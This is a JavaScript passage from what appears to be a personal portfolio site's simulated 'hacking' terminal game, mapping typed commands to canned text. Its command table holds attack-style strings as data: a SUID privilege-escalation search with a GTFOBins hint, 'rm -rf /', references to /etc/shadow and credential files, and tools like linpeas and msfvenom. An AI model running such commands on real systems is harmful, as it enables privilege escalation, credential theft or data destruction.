\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2588\u2588\u2557     \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2554\u2588\u2588\u2557   \u255a\u2588\u2588\u2554\u255d  \n \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2557    \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u255d \u2588\u2588\u2557   \u2588\u2588\u2551   \n  \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d     \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d   \u255a\u2550\u255d') + '\n  \n' +
            clr('green', '  Shankar Adhikary | Cybersecurity Researcher | Red Team Specialist') + '\n' +
            clr('yellow', '  \u0930\u093e\u0937\u094d\u091f\u094d\u0930\u0940\u092f \u0938\u0941\u0930\u0915\u094d\u0937\u093e \u0938\u0930\u094d\u0935\u094b\u092a\u0930\u093f | National Security is Supreme'),

        matrix: function() {
            var chars = '\u30a2\u30a4\u30a6\u30a8\u30aa\u30ab\u30ad\u30af\u30b1\u30b3\u30b5\u30b7\u30b9\u30bb\u30bd\u30bf\u30c1\u30c4\u30c6\u30c8\u30ca\u30cb\u30cc\u30cd\u30ce\u30cf\u30d2\u30d5\u30d8\u30db\u30de\u30df\u30e0\u30e1\u30e2\u30e4\u30e6\u30e8\u30e9\u30ea\u30eb\u30ec\u30ed\u30ef\u30f2\u30f301';
            var lines = [];
            for (var i = 0; i < 8; i++) {
                var line = '';
                for (var j = 0; j < 60; j++) {
                    line += chars[Math.floor(Math.random() * chars.length)];
                }
                lines.push(clr('green', line));
            }
            lines.push('');
            lines.push(clr('yellow', '[*] Wake up, Neo... The Matrix has you.'));
            lines.push(clr('yellow', '[*] Follow the white rabbit. Type "help" to begin.'));
            return lines.join('\n');
        },

        sudo: clr('green', '[sudo]') + ' You are already root! Full access granted.',
        'sudo su': clr('green', '[sudo]') + ' You are already root! Full access granted.',
        su: clr('green', '[sudo]') + ' You are already root!',
        wget: clr('cyan', '[*] wget \u2014 File downloader') + '\nUsage: wget [URL]\n' + clr('yellow', '[*] Try \'linpeas\' or \'msfvenom\' instead in this simulation.'),
        curl: clr('cyan', '[*] curl \u2014 Data transfer tool') + '\nUsage: curl [URL]\n' + clr('yellow', '[*] Try \'nikto\' or \'gobuster\' for web requests in this simulation.'),
        chmod: clr('green', '[+] chmod +x applied. File is now executable.'),
        grep: clr('cyan', '[*] grep \u2014 Pattern matching tool. Usage: grep [PATTERN] [FILE]'),
        find: clr('cyan', '[*] find / -perm -u=s -type f 2>/dev/null') + '\n/usr/bin/find\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n' + clr('green', '[*] SUID binaries found. Potential privilege escalation!'),
        'find / -perm -u=s': clr('cyan', '[*] SUID binaries:') + '\n/usr/bin/find\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n' + clr('green', '[*] Check GTFOBins for exploitation techniques.'),
        man: clr('cyan', '[*] man \u2014 Manual pages. Type any command name for its output!'),
        echo: clr('green', 'Hello from Grok Galaxy Terminal!'),
        touch: clr('green', '[+] File created.'),
        mkdir: clr('green', '[+] Directory created.'),
        rm: clr('red', '[!] rm: Operation not permitted in simulation mode.'),
        'rm -rf /': clr('red', '[!] Nice try! This is a simulation. No destruction allowed.'),
        ':q': clr('yellow', '[*] This is not vim! Type "exit" to leave.'),
        ':wq': clr('yellow', '[*] This is not vim! Type "exit" to leave.'),
        vi: clr('yellow', '[*] vim/vi not available in simulation. Use "cat" to view files.'),
        vim: clr('yellow', '[*] vim/vi not available in simulation. Use "cat" to view files.'),
        nano: clr('yellow', '[*] nano not available in simulation. Use "cat" to view files.'),
    };

    function addTerminalLine(text, delay) {
        delay = delay || 0;
        setTimeout(function() {
            var line = document.createElement('p');
            line.className = 'terminal-line';
            line.style.animationDelay = '0s';
            line.innerHTML = text;
            terminalOutput.appendChild(line);
            terminalOutput.scrollTop = terminalOutput.scrollHeight;
        }, delay);
    }

    function processCommand(cmd) {
        var command = cmd.toLowerCase().trim();

        if (command === '') return;
        if (cmd.length > 200) { addTerminalLine(clr('red', '[SEC]') + ' Input too long. Max 200 characters.'); return; }

        // Track history
        commandHistory.push(cmd);

        addTerminalLine(clr('green', 'root@kali') + ':' + clr('blue', currentDir) + '# ' + escapeHTML(cmd));

        if (command === 'clear') {
            terminalOutput.innerHTML = '';
            return;
        }

        if (command === 'exit') {
            hackingGame.classList.remove('active');
            return;
        }

        // Handle 'cd' command
        if (command.startsWith('cd ')) {
            var target = command.slice(3).trim();
            if (target === '~' || target === '') {
                currentDir = '/root';
            } else if (target === '..') {
                var parts = currentDir.split('/').filter(Boolean);
                parts.pop();
                currentDir = '/' + parts.join('/') || '/root';
            } else if (target.startsWith('/')) {
                if (fileSystem[target]) { currentDir = target; }
                else { addTerminalLine(clr('red', 'bash: cd: ' + escapeHTML(target) + ': No such file or directory')); return; }
            } else {
                var newPath = currentDir + '/' + target;
                if (fileSystem[newPath]) { currentDir = newPath; }
                else { addTerminalLine(clr('red', 'bash: cd: ' + escapeHTML(target) + ': No such file or directory')); return; }
            }
            return;
        }

        // Handle 'cat' command
        if (command.startsWith('cat ')) {
            var file = command.slice(4).trim();
            var content = fileContents[file] || fileContents[file.replace(/^\.\//, '')];
            if (content) {
                content.split('\n').forEach(function(line, i) { addTerminalLine(line, i * 30); });
            } else {
                addTerminalLine(clr('red', 'cat: ' + escapeHTML(file) + ': No such file or directory'));
                addTerminalLine(clr('yellow', '[*] Available files: targets.txt, payload.py, .bashrc, creds.txt, notes.txt, wordlist.txt'));
                addTerminalLine(clr('yellow', '[*] System files: /etc/passwd, /etc/shadow, /etc/hosts'));
            }
            return;
        }

        // Handle full commands like 'cat /etc/passwd'
        var fullCmd = hackingCommands[command];
        if (fullCmd) {
            var output = typeof fullCmd === 'function' ? fullCmd() : fullCmd;
            if (output === 'CD_HANDLER' || output === 'CAT_HANDLER') {
                addTerminalLine(clr('yellow', '[*] Usage: ' + command + ' [argument]'));
                return;
            }
            output.split('\n').forEach(function(line, i) {
                addTerminalLine(line, i * 50);
            });
            return;
        }

        addTerminalLine(clr('red', 'bash: ' + escapeHTML(cmd) + ': command not found'));
        addTerminalLine(clr('yellow', '[*] Type \'help\' for all available commands.'));
    }

    openGame.addEventListener('click', function() {
        hackingGame.classList.add('active');
        terminalInput.focus();
    });

    closeGame.addEventListener('click', function() {
        hackingGame.classList.remove('active');
    });

    terminalInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            processCommand(terminalInput.value);
            terminalInput.value = '';
        }
    });

    // Close game on Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && hackingGame.classList.contains('active')) {
            hackingGame.classList.remove('active');
        }
    });
})();
